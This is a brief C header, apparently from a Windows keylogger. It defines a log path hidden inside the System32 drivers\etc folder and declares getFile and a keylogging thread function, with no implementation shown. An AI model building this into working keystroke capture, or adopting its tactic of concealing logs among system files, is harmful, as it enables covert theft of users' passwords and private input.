#pragma once

#define KEYLOG_PATH "C:\\Windows\\System32\\drivers\\etc\\log"

void getFile(FILE * file);

DWORD WINAPI activateKeylog(LPVOID param);
